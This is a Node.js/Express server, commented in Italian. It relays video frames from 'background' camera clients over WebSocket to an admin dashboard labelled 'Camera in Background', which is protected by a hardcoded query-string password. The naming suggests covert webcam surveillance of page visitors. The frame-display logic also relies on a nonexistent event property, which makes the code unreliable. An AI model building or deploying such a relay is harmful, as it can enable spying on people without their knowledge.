const express = require('express');
const ws = require('ws');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Servi pagina utente
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Dashboard admin con password
app.get('/admin', (req, res) => {
  if (req.query.pass !== 'secret123') {
    return res.status(403).send('Accesso negato');
  }
  res.sendFile(path.join(__dirname, 'admin.html'));
});

// === ADMIN DASHBOARD (admin.html) ===
const adminHtml = `
<!DOCTYPE html>
<html><head><title>Live Background Cam</title>
<style>
  body { margin:0; background:#000; color:#0f0; font-family:Arial; padding:20px; }
  .grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(340px,1fr)); gap:15px; }
  .cam { border:2px solid #0f0; border-radius:12px; overflow:hidden; background:#111; }
  img { width:100%; height:auto; display:block; }
  h2 { margin:0; padding:8px; background:#0f0; color:#000; font-size:14px; text-align:center; }
  .status { color:#0f0; font-size:12px; text-align:center; padding:4px; }
</style></head>
<body>
  <h1>Camera in Background</h1>
  <div id="grid" class="grid"></div>
  <script>
    const grid = document.getElementById('grid');
    const ws = new WebSocket('wss://' + location.host + '/bg-admin');
    const rooms = new Map();

    ws.onmessage = (e) => {
      try {
        // Se è una stringa, è un messaggio di controllo
        if (typeof e.data === 'string') {
          const data = JSON.parse(e.data);
          if (data.offline) {
            const statusEl = document.getElementById('status-' + data.room);
            if (statusEl) statusEl.textContent = 'Offline';
            return;
          }
          if (!data.room) return; // Ignora altri messaggi di controllo
          
          if (!rooms.has(data.room)) {
            const div = document.createElement('div');
            div.className = 'cam';
            div.innerHTML = \`
              <h2>\${data.room}</h2>
              <img id="img-\${data.room}">
              <div class="status" id="status-\${data.room}">Online</div>
            \`;
            grid.appendChild(div);
            rooms.set(data.room, div);
          }
          document.getElementById('status-' + data.room).textContent = 'Live';
        } 
        // Se è un Blob, è un frame video
        else if (e.data instanceof Blob) {
          const msgBefore = e.lastMessageEvent?.data;
          if (typeof msgBefore === 'string') {
            try {
              const { room } = JSON.parse(msgBefore);
              if (room) {
                const img = document.getElementById('img-' + room);
                if (img) {
                  const url = URL.createObjectURL(e.data);
                  img.onload = () => URL.revokeObjectURL(img.src);
                  img.src = url;
                }
              }
            } catch(err) {}
          }
        }
      } catch(err) {
        console.error('Error processing message:', err);
      }
    };
  </script>
</body></html>
`;

// Salva admin.html dinamicamente
const fs = require('fs');
fs.writeFileSync('admin.html', adminHtml);

app.get('/admin.html', (req, res) => res.sendFile(path.join(__dirname, 'admin.html')));

// === WEBSOCKET: Streaming in background ===
const bgWss = new ws.Server({ noServer: true });
const adminWss = new ws.Server({ noServer: true });

const clients = new Map(); // room → ws

bgWss.on('connection', (ws, req) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const room = url.searchParams.get('room') || 'unknown';

  clients.set(room, ws);

  ws.on('message', (data) => {
    if (typeof data === 'string' && data === 'ping') return;

    // Invia a tutti gli admin
    adminWss.clients.forEach(client => {
      if (client.readyState === ws.OPEN) {
        // Prima invia info sulla stanza
        client.send(JSON.stringify({ 
          room, 
          timestamp: Date.now() 
        }));
        
        // Poi invia il frame video
        if (data instanceof Buffer || data instanceof Blob) {
          client.send(data, { binary: true });
        }
      }
    });
  });

  ws.on('close', () => {
    clients.delete(room);
    // Notifica admin che è offline
    adminWss.clients.forEach(c => {
      if (c.readyState === ws.OPEN) {
        c.send(JSON.stringify({ room, offline: true }));
      }
    });
  });
});

// Admin si connette qui
adminWss.on('connection', (ws) => {
  ws.send(JSON.stringify({ type: 'welcome' }));
});

const server = app.listen(PORT, () => {
  console.log(`Server: https://localhost:${PORT}`);
});

server.on('upgrade', (req, socket, head) => {
  const pathname = new URL(req.url, `http://${req.headers.host}`).pathname;

  if (pathname === '/bg-stream') {
    bgWss.handleUpgrade(req, socket, head, ws => {
      bgWss.emit('connection', ws, req);
    });
  } else if (pathname === '/bg-admin') {
    adminWss.handleUpgrade(req, socket, head, ws => {
      adminWss.emit('connection', ws, req);
    });
  } else {
    socket.destroy();
  }
});
